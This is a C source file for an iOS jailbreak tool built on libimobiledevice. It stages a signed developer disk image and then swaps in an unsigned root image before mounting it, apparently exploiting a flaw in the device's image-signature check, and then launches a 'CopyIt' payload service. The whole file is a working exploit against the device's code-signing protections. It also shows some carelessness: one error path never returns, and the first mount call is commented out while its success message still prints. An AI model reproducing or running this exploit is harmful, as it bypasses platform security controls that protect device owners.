#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>

#include <sys/time.h>
#include <sys/stat.h>
#include <assert.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>

#include <libimobiledevice/libimobiledevice.h>
#include <libimobiledevice/lockdown.h>
#include <libimobiledevice/afc.h>
#include <libimobiledevice/notification_proxy.h>
#include <libimobiledevice/mobile_image_mounter.h>
#include "prototypes.h"


int main(int argc, char** argv)
{
    if (argc < 4)
    {
        printf("Usage : %s DeveloperDiskImage.dmg DeveloperDiskImage.dmg.signature Root.dmg\n", argv[0]);
        return EXIT_FAILURE;
    }


    idevice_t device = NULL;
    lockdownd_service_descriptor_t service = NULL;
    lockdownd_client_t client = NULL;
    afc_client_t cliente = NULL;
    mobile_image_mounter_client_t mim = NULL;





    if (IDEVICE_E_SUCCESS != idevice_new(&device, NULL))
    {
        printf("No device found, is it plugged in?\n");
        return EXIT_FAILURE;
    }





    if (LOCKDOWN_E_SUCCESS != lockdownd_client_new_with_handshake(device, &client, "ideviceclient")) {
		idevice_free(device);
		printf("Exiting.\n");
		return EXIT_FAILURE;
	}
	if (lockdownd_start_service(client, AFC_SERVICE_NAME, &service) != LOCKDOWN_E_SUCCESS)
	{
        printf("Impossible to start AFC service !\n");
        return EXIT_FAILURE;
	}




    if (afc_client_new(device, service, &cliente) != AFC_E_SUCCESS)
    {
        printf("Impossible to start AFC !\nExiting !\n");
        return EXIT_FAILURE;
    }
    if (afc_make_directory(cliente, "PublicStaging") != AFC_E_SUCCESS)
    {
        printf("Impossible to create the folder !\nExiting !\n");
        return EXIT_FAILURE;
    }
    afc_remove_path(cliente, "PublicStaging/staging.dimage");
    qwrite(cliente, argv[1], "PublicStaging/staging.dimage");
    qwrite(cliente, argv[3], "PublicStaging/ddi.dimage");




    if (lockdownd_start_service(client, MOBILE_IMAGE_MOUNTER_SERVICE_NAME, &service) != LOCKDOWN_E_SUCCESS)
    {
        printf("Impossible to start MobileImageMounter service !\n");
        EXIT_FAILURE;
    }
    if (mobile_image_mounter_new(device, service, &mim) != MOBILE_IMAGE_MOUNTER_E_SUCCESS)
    {
        printf("Can't start MobileImageMounter !\n");
        return EXIT_FAILURE;
    }

    char sig[8192];

    size_t sig_length = 0;
    char *imagetype = NULL;
    FILE *f = fopen(argv[2], "rb");
    if (!f)
    {
        printf("Error opening signature file '%s'", argv[2]);
        return EXIT_FAILURE;
    }
    sig_length = fread(sig, 1, sizeof(sig), f);
    fclose(f);
    if (sig_length == 0)
    {
			fprintf(stderr, "Could not read signature from file '%s'\n", argv[2]);
			return EXIT_FAILURE;
    }
    f = fopen(argv[1], "rb");
    if (!f)
    {
        printf("Error opening image file '%s'\n", argv[1]);
        return EXIT_FAILURE;
    }

    if (!imagetype)
    {
        imagetype = strdup("Developer");
    }
    plist_t result = NULL;
    /*if (mobile_image_mounter_mount_image(mim, "staging.dimage", sig, sig_length, imagetype, &result) != MOBILE_IMAGE_MOUNTER_E_SUCCESS)
    {
        printf("Unable to mount %s !\n", argv[1]);
        return EXIT_FAILURE;
    }*/
    printf("DeveloperDiskImage mounted successfully !\n");
    afc_rename_path(cliente, "PublicStaging/ddi.dimage", "PublicStaging/staging.dimage");
    if (mobile_image_mounter_mount_image(mim, "staging.dimage", sig, sig_length, imagetype, &result) != MOBILE_IMAGE_MOUNTER_E_SUCCESS)
    {
        printf("Unable to mount %s !\n", argv[1]);
        return EXIT_FAILURE;
    }

    printf("Running Jailbreak Payload...");

    if (lockdownd_start_service(client, "CopyIt", &service) != LOCKDOWN_E_SUCCESS)
    {
        printf("Impossible to launch payload ! !\n");
        return EXIT_FAILURE;
    }
    printf("Jailbreak Over !\nYour device is rebooting and it will be jailbroken...\n\nCredits : @FrCoder for the linux code\n@winocm & @ih8sn0w for initial p0sixspwn code\nAnd others for libimobiledevice...\n\n");
    return EXIT_SUCCESS;
}
